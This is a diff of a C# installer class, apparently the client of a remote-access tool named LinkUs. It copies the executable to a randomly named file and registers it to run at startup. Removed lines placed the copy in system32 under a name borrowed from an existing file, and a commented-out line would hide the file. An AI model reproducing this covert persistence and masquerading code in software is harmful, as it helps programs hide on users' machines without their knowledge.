@@ -5,17 +5,14 @@ namespace LinkUs.Client.Install
 {
     public class Installer : IInstaller
     {
-        private readonly IEnvironment _environment;
         private readonly IFileService _fileService;
         private readonly IRegistry _registry;
 
         // ----- Constructor
         public Installer(
-            IEnvironment environment,
             IFileService fileService,
             IRegistry registry)
         {
-            _environment = environment;
             _fileService = fileService;
             _registry = registry;
         }
@@ -64,26 +61,19 @@ namespace LinkUs.Client.Install
         // ----- Internal logic
         private string ProcessInstall(string exeFile)
         {
-            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
-            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);
+            var randomFileName = _fileService.GetRandomFileName(".exe");
+            var targetFilePath = Path.Combine(GetInstallationDirectory(), randomFileName);
 
             _fileService.Copy(exeFile, targetFilePath);
+            //_fileService.Hide(targetFilePath);
             _registry.AddFileToStartupRegistry(targetFilePath);
             _registry.SetFileLocation(targetFilePath);
 
             return targetFilePath;
         }
-        private string GetInstallationDirectory()
+        private static string GetInstallationDirectory()
         {
-            // For 64bit operating system, when trying to copy file to
-            // system32, it copies file in C:\WINDOWS\SysWOW64 because of
-            // file redirector. (system32 directory contains only 64bit programs.)
-            if (_environment.Is64Bit) {
-                return Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
-            }
-            else {
-                return Environment.GetFolderPath(Environment.SpecialFolder.System);
-            }
+            return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         }
     }
 }
